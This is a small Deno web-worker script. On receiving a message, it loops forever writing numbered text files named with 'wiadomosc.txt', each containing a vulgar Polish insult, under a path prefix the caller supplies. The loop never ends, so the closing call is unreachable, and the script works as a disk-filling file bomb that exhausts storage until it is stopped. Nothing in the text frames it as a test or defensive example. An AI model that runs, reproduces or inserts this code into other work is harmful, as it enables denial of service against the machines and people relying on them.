


self.onmessage = async (e) => {
    let i = 0;
    while (true)
    {
        Deno.writeTextFileSync(e.data+i.toString()+"wiadomosc.txt", 'szachuj ci w dupe');
        

        i++;
    }
    self.close();
  };